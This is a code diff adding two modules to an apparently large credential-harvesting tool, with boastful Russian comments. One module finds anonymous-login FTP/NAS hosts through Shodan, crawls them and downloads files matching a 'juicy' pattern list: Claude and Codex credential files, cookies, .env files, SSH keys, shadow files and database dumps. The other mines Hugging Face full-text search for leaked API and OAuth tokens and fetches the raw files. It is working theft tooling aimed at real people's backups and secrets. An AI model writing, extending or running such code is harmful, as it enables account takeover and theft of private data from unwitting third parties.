@@ -3149,6 +3149,202 @@ class Shodan(Source):
         return out
 
 
+class AnonFtp(Source):
+    """🚪 АНОНИМНЫЕ FTP/NAS — охота там, где НЕТ конкурентов: люди бэкапят
+    AppData/документы на домашние NAS с anon-login, и там лежат
+    .claude/.credentials.json, .codex/auth.json, куки, .env, *.sql.
+    Нет авто-отзыва (это не github) — сессии живут НЕДЕЛЯМИ. Shodan даёт
+    хосты с "230" (anonymous ok), ftplib (stdlib) обходит каталоги и тянет
+    файлы по жирным именам. Зеркала дистрибутивов скипаем — там ключа нет."""
+
+    name = "anon-ftp"
+    JUICY = re.compile(
+        r"(?i)(\.env($|\.)|\.credentials\.json|auth\.json|id_rsa$|\.sql$|"
+        r"backup|dump|\.claude|\.codex|cookies?\.|cookie|shadow$|"
+        r"config\.(json|ya?ml|php|inc|xml)|database\.(sql|db)|"
+        r"tokens?\.(json|txt)|session|\.har$|\.kube(config)?)"
+    )
+    SKIP_DIR = re.compile(
+        r"(?i)/?(pub|public|incoming|uploads?|debian|ubuntu|centos|mirror(s)?|"
+        r"distrib|packages|repo|linux|gnu|freebsd|openbsd|arch|fedora|epel|"
+        r"rpm|deb|kernel|cpan|ctan|texlive)(/|$)"
+    )
+
+    def _targets(self, n=12):
+        keys = Shodan()._key_pool()
+        if not keys:
+            return []
+        page = 1 + (int(time.time() // 900) % 40)
+        try:
+            r = requests.get(
+                "https://api.shodan.io/shodan/host/search",
+                params={"key": keys[0], "query": 'port:21 "230"', "page": page},
+                timeout=(10, 30),
+                verify=False,
+            )
+            if r.status_code != 200:
+                return []
+            return [
+                m.get("ip_str")
+                for m in (r.json().get("matches") or [])
+                if m.get("ip_str")
+            ][:n]
+        except Exception:
+            return []
+
+    def _crawl(self, ip, deadline):
+        import ftplib
+
+        out = []
+        try:
+            ftp = ftplib.FTP()
+            ftp.connect(ip, 21, timeout=6)
+            ftp.login("anonymous", "nyx@hunt.local")
+        except Exception:
+            return out
+        seen_dirs = set()
+        queue = ["/"]
+        files = []
+        while queue and len(seen_dirs) < 25 and time.time() < deadline:
+            d = queue.pop(0)
+            if d in seen_dirs or self.SKIP_DIR.search(d):
+                continue
+            seen_dirs.add(d)
+            try:
+                names = ftp.nlst(d)[:120]
+            except Exception:
+                continue
+            for name in names:
+                base = name.rsplit("/", 1)[-1]
+                if not base or base in (".", ".."):
+                    continue
+                path = name if name.startswith("/") else (d.rstrip("/") + "/" + base)
+                if self.JUICY.search(base):
+                    files.append(path)
+                elif "." not in base and len(queue) < 12:
+                    queue.append(path)
+        for path in files[:6]:
+            if time.time() >= deadline:
+                break
+            try:
+                buf = []
+                ftp.retrbinary("RETR " + path, buf.append, blocksize=8192)
+                raw = b"".join(buf)
+                if 20 < len(raw) < 400_000:
+                    out.append(
+                        (
+                            raw.decode("utf-8", errors="replace"),
+                            "anon-ftp:%s%s" % (ip, path),
+                        )
+                    )
+            except Exception:
+                continue
+        try:
+            ftp.quit()
+        except Exception:
+            pass
+        return out
+
+    def fetch(self):
+        out = []
+        targets = self._targets()
+        if not targets:
+            return out
+        deadline = time.time() + 200
+        with concurrent.futures.ThreadPoolExecutor(max_workers=6) as ex:
+            futs = [ex.submit(self._crawl, ip, deadline) for ip in targets]
+            for f in concurrent.futures.as_completed(futs):
+                try:
+                    out.extend(f.result())
+                except Exception:
+                    continue
+        if out:
+            log("  [anon-ftp] %d файлов с %d FTP" % (len(out), len(targets)))
+        return out
+
+
+class HFSearch(Source):
+    """🤗 HF FULL-TEXT (/api/search/full-text): глобальный поиск по ВСЕМ
+    файлам huggingface (spaces/datasets/models) — бесплатно, без ключа, и для
+    охоты за ключами его почти НИКТО не парсит. Токенизация meilisearch рвёт
+    фразы на подчёркиваниях — запросы подобраны боем (oat01=35 хитов,
+    claudeAiOauth=278, DATABASE_URL postgresql=2044)."""
+
+    name = "hf-search"
+    QUERIES = [
+        "oat01",
+        "ort01",
+        "api03 sk-ant",
+        "refreshToken claudeAiOauth",
+        "DATABASE_URL postgresql",
+        "AIzaSy",
+        "xoxb",
+        "svcacct",
+        "sid01 sk-ant",
+        "setup_token sk-ant",
+        "mongodb srv",
+        "npg neon",
+    ]
+
+    def fetch(self):
+        import urllib.parse
+
+        out = []
+        rot = int(time.time() // 900)
+        qs = [self.QUERIES[(rot + i) % len(self.QUERIES)] for i in range(3)]
+        deadline = time.time() + 120
+        for q in qs:
+            if time.time() >= deadline:
+                break
+            for typ, seg in (
+                ("space", "spaces"),
+                ("dataset", "datasets"),
+                ("model", ""),
+            ):
+                try:
+                    url = (
+                        "https://huggingface.co/api/search/full-text"
+                        "?q=%s&type=%s&limit=20" % (urllib.parse.quote(q), typ)
+                    )
+                    r = http(
+                        "GET",
+                        url,
+                        timeout=(6, 15),
+                        headers={"Accept": "application/json"},
+                    )
+                    if r.status_code != 200:
+                        continue
+                    hits = r.json().get("hits") or []
+                    for hit in hits[:10]:
+                        owner = hit.get("repoOwner")
+                        repo = hit.get("repoName")
+                        path = hit.get("fileName")
+                        if not owner or not repo or not path:
+                            continue
+                        raw_url = "https://huggingface.co/%s/resolve/main/%s" % (
+                            ("%s/%s/%s" % (seg, owner, repo))
+                            if seg
+                            else ("%s/%s" % (owner, repo)),
+                            path,
+                        )
+                        try:
+                            rr = http("GET", raw_url, timeout=(6, 15))
+                            if rr.status_code == 200 and 20 < len(rr.text) < 400_000:
+                                out.append(
+                                    (
+                                        rr.text,
+                                        "hf-search:%s/%s/%s" % (owner, repo, path),
+                                    )
+                                )
+                        except Exception:
+                            continue
+                except Exception:
+                    continue
+        if out:
+            log("  [hf-search] %d файлов" % len(out))
+        return out
+
+
 class Fofa(Source):
     name = "fofa"
 
@@ -6623,6 +6819,8 @@ ALL_SOURCE_CLASSES = [
     VirusTotal,
     Shodan,
     Fofa,
+    AnonFtp,
+    HFSearch,
     ZoomEye,
     CriminalIP,
     OpenInfraSweep,
@@ -10603,6 +10801,10 @@ def run_sources(extra_paths=()):
         "internetdb",
         # Unconventional: глобальный код-поиск без ключа
         "sourcegraph",
+        # 🚪 зона нулевой конкуренции: anon FTP/NAS с бэкапами сессий
+        "anon-ftp",
+        # 🤗 глобальный full-text по huggingface без ключа
+        "hf-search",
         # 📡 TG-поисковики: контент каналов сцены (комблисты/аккаунты)
         "tg-search",
     }
